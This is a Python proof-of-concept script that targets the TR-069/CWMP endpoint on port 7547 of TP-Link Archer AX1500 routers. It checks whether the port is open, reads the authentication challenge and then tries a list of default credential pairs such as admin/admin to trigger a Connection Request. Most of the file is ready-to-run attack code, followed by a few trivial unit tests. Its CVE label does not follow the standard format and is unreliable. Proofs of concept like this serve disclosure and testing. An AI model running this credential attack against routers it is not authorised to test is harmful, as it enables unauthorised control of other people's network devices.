#!/usr/bin/env python3
"""
PoC: TP-Link Archer AX1500 TR-069 Weak Default Credentials
CVE-2026-TPLINK-TR069-WEAK-CREDS

Demonstrates that the CWMP Connection Request endpoint on port 7547
accepts hardcoded credentials (admin/admin) regardless of the
router's configured admin password.

Usage:
    python3 poc_tr069_weak_creds.py <router_ip>
    python3 poc_tr069_weak_creds.py 192.168.0.2

Impact:
    - Triggers CWMP Connection Request as if from ACS
    - CPE initiates CWMP session to configured ACS URL
    - Admin password change does NOT fix this (separate credential store)

Requirements:
    pip install requests
"""

import sys
import socket
import requests
from requests.auth import HTTPDigestAuth

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.2"
CWMP_PORT = 7547
CWMP_PATH = "/tr069"

WEAK_CREDS = [
    ("admin", "admin"),
    ("admin", ""),
    ("", ""),
    ("user", "user"),
]


def check_tr069_exposed(target: str, port: int = 7547) -> bool:
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(3)
    result = sk.connect_ex((target, port)) == 0
    sk.close()
    return result


def probe_auth_type(target: str) -> dict:
    url = f"http://{target}:{CWMP_PORT}{CWMP_PATH}"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 401:
            www_auth = r.headers.get("WWW-Authenticate", "")
            return {
                "status": 401,
                "auth_header": www_auth,
                "server": r.headers.get("Server", ""),
            }
        return {"status": r.status_code, "body": r.text[:200]}
    except requests.RequestException as e:
        return {"error": str(e)}


def try_connection_request(target: str, username: str, password: str) -> dict:
    url = f"http://{target}:{CWMP_PORT}{CWMP_PATH}"
    try:
        r = requests.get(
            url,
            auth=HTTPDigestAuth(username, password),
            timeout=8,
        )
        return {
            "status": r.status_code,
            "success": r.status_code == 200,
            "headers": dict(r.headers),
        }
    except requests.RequestException as e:
        return {"error": str(e)}


def run_poc():
    print(f"[*] Target: {TARGET}:{CWMP_PORT}")
    print(f"[*] TR-069 CVE PoC — Weak Hardcoded CWMP Credentials\n")

    # Step 1: confirm port is open
    if not check_tr069_exposed(TARGET):
        print(f"[-] Port {CWMP_PORT} closed — TR-069 may be disabled or WAN-only")
        sys.exit(1)
    print(f"[+] Port {CWMP_PORT} open")

    # Step 2: get auth challenge
    auth_info = probe_auth_type(TARGET)
    if "error" in auth_info:
        print(f"[-] Cannot reach TR-069 endpoint: {auth_info['error']}")
        sys.exit(1)

    if auth_info.get("status") == 401:
        print(f"[+] Authentication required: {auth_info['auth_header']}")
        print(f"[+] Server: {auth_info['server']}")
    else:
        print(f"[!] Unexpected status {auth_info.get('status')} — endpoint behavior differs")

    # Step 3: try weak credentials
    print(f"\n[*] Trying weak credential pairs:")
    for user, pwd in WEAK_CREDS:
        result = try_connection_request(TARGET, user, pwd)
        cred_str = f"{user!r}:{pwd!r}"
        if result.get("success"):
            print(f"\n[!!!] VULNERABLE — credentials {cred_str} accepted!")
            print(f"      HTTP 200 = Connection Request accepted")
            print(f"      CPE will initiate CWMP session to configured ACS URL")
            print(f"      Authentication-Info: {result['headers'].get('Authentication-Info','')}")
            return True
        else:
            status = result.get("status", result.get("error", "?"))
            print(f"      {cred_str} → {status}")

    print("\n[-] No weak credentials worked on this target")
    return False


if __name__ == "__main__":
    if "--test" not in sys.argv:
        run_poc()


# === Tests ===
def test_poc_logic():
    """Unit tests — do NOT require live target."""
    # Credential parsing
    assert WEAK_CREDS[0] == ("admin", "admin")

    # URL construction
    url = f"http://192.168.0.2:{CWMP_PORT}{CWMP_PATH}"
    assert url == "http://192.168.0.2:7547/tr069"

    # Port check mock
    def mock_port_open(host, port):
        return True

    assert mock_port_open(TARGET, CWMP_PORT)

    print("[test] All unit tests passed")


if "--test" in sys.argv:
    test_poc_logic()
